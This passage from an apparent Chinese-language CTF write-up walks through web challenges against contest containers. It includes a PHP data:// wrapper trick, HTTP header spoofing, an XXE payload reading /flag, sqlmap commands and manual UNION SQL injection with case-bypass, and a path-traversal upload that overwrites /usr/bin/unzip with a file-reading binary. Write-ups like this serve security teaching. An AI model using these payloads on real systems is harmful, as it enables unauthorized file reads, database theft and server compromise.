&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;Try again&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>因此我们需要传入两个参数,令lucky非数字且在PHP弱类型比较中与777相等;令file_get_contents($context,’r’)的值为”humanoid”,我们需要用到data:&#x2F;&#x2F;伪协议伪造从文件读取数据.<code>data://text/plain;base64,aHVtYW5vaWQ=</code>#aHVtYW5vaWQ&#x3D;是humanoid的base64编码</p>
+<p>使用python进行双重传参.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment"># 构造伪协议字符串，以伪造 &quot;humanoid&quot; 字符串</span></span><br><span class="line">fake_context = <span class="string">&quot;data://text/plain;base64,aHVtYW5vaWQ=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义POST请求参数</span></span><br><span class="line">post_params = &#123;<span class="string">&#x27;context&#x27;</span>: fake_context&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标URL</span></span><br><span class="line">url = <span class="string">&#x27;http://1.container.jingsai.apicon.cn:32212/findme.php/luckynumber=777a&#x27;</span></span><br><span class="line"><span class="comment"># 发送POST请求</span></span><br><span class="line">post_response = requests.post(url, data=post_params)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;POST:&#x27;</span>, post_response.text)</span><br></pre></td></tr></table></figure>
+
+<p>注意,这里用到了php弱类型比较.”777”&#x3D;&#x3D;777 777a&#x3D;&#x3D;777均符合要求,但”777”不满足payload,会使条件不满足.</p>
+<p>flag:<code>VIDAR&#123;ReAD*My_F1lE_inA*Flexible_way_and_ExPl0it!mySEcret&#125;</code></p>
+<h3 id="Do-you-know-HTTP"><a href="#Do-you-know-HTTP" class="headerlink" title="Do you know HTTP"></a>Do you know HTTP</h3><p>1.<strong>请从vidar.club来到这个页面</strong></p>
+<p>Referer:vidar.club</p>
+<p>2.<strong>请通过Mozilla&#x2F;5.0 (Vidar-Team; VidarOS x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;51.0.2704.103 Safari&#x2F;537.36来到这个页面</strong></p>
+<p>User-Agent:Mozilla&#x2F;5.0 (Vidar-Team; VidarOS x86_64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;51.0.2704.103 Safari&#x2F;537.36</p>
+<p>3.<strong>让请求从本地来到这个页面</strong></p>
+<p>X-Forwarded-For:127.0.0.1</p>
+<p>4.<strong>Hello guest! only admin can get flag.</strong></p>
+<p>Cookie:user&#x3D;admin</p>
+<p>5.<strong>You are admin! Flag is in this page</strong></p>
+<p>headers:Fl4g:<code>VIDAR&#123;HTTP_1s^re4lly$1nteresting&#125;</code></p>
+<h3 id="watch-carefully"><a href="#watch-carefully" class="headerlink" title="watch carefully"></a>watch carefully</h3><p>进去打开,是一个文件上传页面,使用burpsuite抓包,会发现除了文件,还有一个元素</p>
+<p>“OurName”:”Vider”</p>
+<p>把vider改成vidar,就可以拿到flag</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>Werkzeug/2.2.3 Python/3.7.17</span><br><span class="line"><span class="attribute">Date</span><span class="punctuation">: </span>Mon, 16 Oct 2023 12:40:32 GMT</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>34</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-perl">&#123;<span class="string">&quot;flag&quot;</span>:<span class="string">&quot;VIDAR&#123;W@tch CaRefu11y&#125;&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>flag:<code>VIDAR&#123;W@tch CaRefu11y&#125;</code></p>
+<h3 id="TuTu’s-Diary-Book"><a href="#TuTu’s-Diary-Book" class="headerlink" title="TuTu’s Diary Book"></a>TuTu’s Diary Book</h3><p>扫描发现上传了源码到&#x2F;<a target="_blank" rel="noopener" href="http://www.tar.gz/">www.tar.gz</a></p>
+<p>下载源码并审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$diary_template</span> = <span class="string">&quot;&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;</span></span><br><span class="line"><span class="string">        &lt;diary&gt;</span></span><br><span class="line"><span class="string">            &lt;date&gt;%s&lt;/date&gt;</span></span><br><span class="line"><span class="string">            &lt;feeling&gt;%s&lt;/feeling&gt;</span></span><br><span class="line"><span class="string">            &lt;content&gt;%s&lt;/content&gt;</span></span><br><span class="line"><span class="string">        &lt;/diary&gt;</span></span><br><span class="line"><span class="string">    &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">date_default_timezone_set</span>(<span class="string">&#x27;Asia/Shanghai&#x27;</span>);</span><br><span class="line">    <span class="variable">$system_date</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$feeling</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$content</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$content</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;⛌ 日记内容不能为空&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$diary</span> = <span class="title function_ invoke__">sprintf</span>(<span class="variable">$diary_template</span>, <span class="variable">$system_date</span>, <span class="variable">$feeling</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="variable">$diary_filename</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>) . <span class="string">&quot;.xml&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./diaries/&#x27;</span> . <span class="variable">$diary_filename</span>, <span class="variable">$diary</span>);</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /readdiary.php?diary_date=&quot;</span> . <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;feeling and content must be set.&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$diary_date</span>)) &#123;</span><br><span class="line">        <span class="comment">// Check diary file.</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^([0-9]&#123;4&#125;)-([0-9]&#123;2&#125;)-([0-9]&#123;2&#125;)$/&#x27;</span>,<span class="variable">$diary_date</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;invaild diary_date input.&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$diary_file</span> = <span class="string">&quot;./diaries/&quot;</span> . <span class="variable">$diary_date</span> . <span class="string">&quot;.xml&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$diary_file</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;†没有这一天的日记†&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// The diary file is now vaild. </span></span><br><span class="line">        <span class="comment">// Read diary file.</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable">$diary_dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">        <span class="variable">$diary_dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$diary_file</span>) , LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">        <span class="variable">$diary</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$diary_dom</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;diary_date must be set.&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt; </span><br><span class="line">	&lt;title&gt;阅读日记&lt;/title&gt; </span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;./css/bootstrap.min.css&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;./js/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;./js/bootstrap.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">	&lt;<span class="title">h2</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">diary</span>-&gt;<span class="title">date</span>; ?&gt;&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h3</span>&gt;这是&lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">htmlspecialchars</span>($<span class="title">diary</span>-&gt;<span class="title">feeling</span>); ?&gt;的一天&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h4</span>&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> <span class="title">str_replace</span>(&quot;\<span class="title">n</span>&quot;, &quot;&lt;<span class="title">br</span>&gt;&quot;, <span class="title">htmlspecialchars</span>($<span class="title">diary</span>-&gt;<span class="title">content</span>)); ?&gt;&lt;/<span class="title">h4</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现使用了extract($_REQUEST)方法来自动更新变量的值,导致了变量覆盖漏洞.</p>
+<p>联想到XXE漏洞,在get参数中传入diary_template&#x3D;</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">diary</span>[<span class="meta">&lt;!ENTITY <span class="keyword">content</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">diary</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">date</span>&gt;</span>%s<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">feeling</span>&gt;</span>%s<span class="tag">&lt;/<span class="name">feeling</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">content</span>&gt;</span><span class="symbol">&amp;content;</span><span class="tag">&lt;/<span class="name">content</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">diary</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意需要使用编码来传,不可以直接传,使用burp修改之后大概像这样</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/newdiary.php?feeling=%E5%BC%80%E5%BF%83&amp;content=123&amp;diary_template=%3C%3Fxml+version%3D%271.0%27+encoding%3D%27utf-8%27%3F%3E%0D%0A%3C%21DOCTYPE+diary%5B%3C%21ENTITY+content+SYSTEM+%22file%3A%2F%2F%2Fflag%22+%3E%5D%3E%0D%0A%3Cdiary%3E%0D%0A++++%3Cdate%3E%25s%3C%2Fdate%3E%0D%0A++++%3Cfeeling%3E%25s%3C%2Ffeeling%3E%0D%0A++++%3Ccontent%3E%24content%3C%2Fcontent%3E%0D%0A%3C%2Fdiary%3E</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1.container.jingsai.apicon.cn:30133</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://1.container.jingsai.apicon.cn:30133/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<p>传上去之后即可得到flag.</p>
+<p>flag:<code>VIDAR&#123;A11_st0r!es_begiN_with_4_f0rgotten_Archive_fi1e&#125;</code></p>
+<p>所有的故事都来源于一个被遗忘的源码备份:)</p>
+<h3 id="Book-Management-System"><a href="#Book-Management-System" class="headerlink" title="Book Management System"></a>Book Management System</h3><p>1.SQLMAP一把梭</p>
+<p>下载好sqlmap,进入有py文件的文件夹,打开文件夹,输入cmd,打开命令行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://1.container.jingsai.apicon.cn:30956/books/1&quot; -dbs</span><br></pre></td></tr></table></figure>
+
+<p>available databases [2]:<br>[<em>] book<br>[</em>] information_schema</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://1.container.jingsai.apicon.cn:30956/books/1&quot; -D book -tables</span><br></pre></td></tr></table></figure>
+
+<p>Database: book<br>[2 tables]<br>+——–+<br>| books  |<br>| secret |<br>+——–+</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://1.container.jingsai.apicon.cn:30956/books/1&quot; -D book -T secret --columns</span><br></pre></td></tr></table></figure>
+
+<p>+——–+———–+<br>| Column | Type      |<br>+——–+———–+<br>| fl4g   | char(255) |<br>+——–+———–+</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://1.container.jingsai.apicon.cn:30956/books/1&quot; -D book -T secret -C fl4g --dump</span><br></pre></td></tr></table></figure>
+
+<p>Database: book<br>Table: secret<br>[1 entry]<br>+——————————–+<br>| fl4g                           |<br>+——————————–+<br>| VIDAR{i^Learned_Sql$Inject1on} |<br>+——————————–+</p>
+<p>2.手动注入</p>
+<p>1’UNION SELECT 1,table_name,1 FROM information_schema.tables LIMIT 2,1 ;%00</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vidar-Team has 1 books called secret</span><br></pre></td></tr></table></figure>
+
+<p>表名是secret</p>
+<p>1’UNION SELECT 1,column_name,1 FROM information_schema.columns LIMIT 4,1 ;%00</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vidar-Team has 1 books called fl4g</span><br></pre></td></tr></table></figure>
+
+<p>字段名是fl4g</p>
+<p>1’UNION SELECT 1,fl4g,1 FROM secret LIMIT 1,1 ;%00</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vidar-Team has 1 books called VIDAR&#123;i^Learned_Sql$Inject1on&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag:<code>VIDAR&#123;i^Learned_Sql$Inject1on&#125;</code></p>
+<h3 id="Book-Management-System-V2"><a href="#Book-Management-System-V2" class="headerlink" title="Book Management System_V2"></a>Book Management System_V2</h3><p>类似第一题,不过不太方便使用sqlmap,就是手注+大小写绕过.</p>
+<p>1’Union Select 1,table_name,1 From infoRmation_schema.tables LIMIT 2,1 ;%00</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vidar-Team has 1 books called seeeeeeeeeeeeeeeecrret</span><br></pre></td></tr></table></figure>
+
+<p>1’Union Select 1,column_name,1 From infoRmation_schema.columns LIMIT 4,1 ;%00</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vidar-Team has 1 books called fllllllllllllllllllllllaaa444g</span><br></pre></td></tr></table></figure>
+
+<p>1’Union Select 1,fllllllllllllllllllllllaaa444g,1 From seeeeeeeeeeeeeeeecrret LIMIT 1,1 ;%00</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vidar-Team has 1 books called VIDAR&#123;U*Re4lly^Kn0wn_Sql$Inject1on&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag:<code>VIDAR&#123;U*Re4lly^Kn0wn_Sql$Inject1on&#125;</code></p>
+<h3 id="unzip-or-not"><a href="#unzip-or-not" class="headerlink" title="unzip, or not?"></a>unzip, or not?</h3><p>源码审计题.提供了一个go源文件和docker文件.</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">r.POST(<span class="string">&quot;/unzip&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">       fh, err := c.FormFile(<span class="string">&quot;file&quot;</span>) <span class="comment">//获取一个名叫file变量的值</span></span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">          log.Println(err)</span><br><span class="line">          c.String(<span class="number">500</span>, <span class="string">&quot;读取文件失败&quot;</span>)</span><br><span class="line">       &#125;</span><br><span class="line">       savepath := filepath.Clean(filepath.Join(<span class="string">&quot;uploads&quot;</span>, strings.ReplaceAll(fh.Filename, <span class="string">&quot;../&quot;</span>, <span class="string">&quot;&quot;</span>)))</span><br><span class="line"></span><br><span class="line">       file, err := fh.Open()</span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">          log.Println(err)</span><br><span class="line">          c.String(<span class="number">500</span>, <span class="string">&quot;读取文件失败&quot;</span>)</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">defer</span> file.Close()</span><br><span class="line"></span><br><span class="line">       saveto, err := os.OpenFile(savepath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, <span class="number">0755</span>)</span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">          log.Println(err)</span><br><span class="line">          c.String(<span class="number">500</span>, <span class="string">&quot;保存文件失败&quot;</span>)</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">defer</span> saveto.Close()</span><br><span class="line"></span><br><span class="line">       _, err = io.Copy(saveto, file)</span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">          <span class="built_in">print</span>(savepath)</span><br><span class="line">          log.Println(err)</span><br><span class="line">          c.String(<span class="number">500</span>, <span class="string">&quot;保存文件失败&quot;</span>)</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       res, err := Unzip(savepath)</span><br><span class="line">       <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">          log.Println(err)</span><br><span class="line">          <span class="built_in">print</span>(savepath)</span><br><span class="line">          c.String(<span class="number">500</span>, <span class="string">&quot;解压失败&quot;</span>)</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// show unzip log</span></span><br><span class="line">       c.String(<span class="number">200</span>, <span class="type">string</span>(res))</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    r.Run(<span class="string">&quot;:8180&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Unzip</span><span class="params">(zipfile <span class="type">string</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line">    unzipdir := filepath.Join(<span class="string">&quot;output&quot;</span>, strconv.Itoa(rand.Int()))</span><br><span class="line">    <span class="built_in">print</span>(unzipdir)</span><br><span class="line">    output, err := exec.Command(<span class="string">&quot;unzip&quot;</span>, <span class="string">&quot;-n&quot;</span>, <span class="string">&quot;-v&quot;</span>, zipfile, <span class="string">&quot;-d&quot;</span>, unzipdir).CombinedOutput()</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>提供了一个go语言接口,允许使用post方法向&#x2F;unzip路由上传文件.</p>
+<p>_, err &#x3D; io.Copy(saveto, file)会把上传的文件拷贝到saveto路径,由此我们可以猜想可以通过目录穿越来实现覆写unzip文件</p>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>File Upload</title>
+</head>
+<body>
+    <h1>Upload a File</h1>
+    <form method="POST" action="http://1.container.jingsai.apicon.cn:31889/unzip" enctype="multipart/form-data">
+        <input type="file" name="file" required>
+        <br>
+        <input type="submit" value="Upload">
+    </form>
+</body>
+</html>
+
+<p>使用gpt生成了上述html代码从而实现上传文件到对应路由.要覆写的文件位于<code>usr/bin/unzip</code>路径,我们使用目录穿越实现覆写.</p>
+<p>我们需要一个二进制文件来实现功能”cat &#x2F;flag”</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>打开Ubuntu虚拟机,open in terminal:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano catflag.c</span><br></pre></td></tr></table></figure>
+
+<p>输入上面的代码,ctrl+s保存,ctrl+x退出编辑.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install gcc</span><br></pre></td></tr></table></figure>
+
+<p>安装gcc编译器</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc catflag.c -o catflag</span><br></pre></td></tr></table></figure>
+
+<p>完成编译,产生二进制文件.由于虚拟机不太方便传文件,我登陆了微信网页文件助手来传输二进制文件.</p>
+<p>复制到桌面上把名字改成unzip,打开burpsuite,上传抓包修改文件名为”….&#x2F;&#x2F;….&#x2F;&#x2F;bin&#x2F;usr&#x2F;unzip”(双写绕过目录穿越检测)</p>
+<p>这样指令就会覆盖成功.这个时候重新上传一个文件,就可以得到flag(这题是动态flag,就不放了)</p>
+<p>也可以自己在docker中进行测试,我的docker比较烂(x)</p>
+<h3 id="What’s-problem-In-Login-Code"><a href="#What’s-problem-In-Login-Code" class="headerlink" title="What’s problem In Login Code?"></a>What’s problem In Login Code?</h3><p>下载下来了一个jar文件,使用idea进行反编译</p>
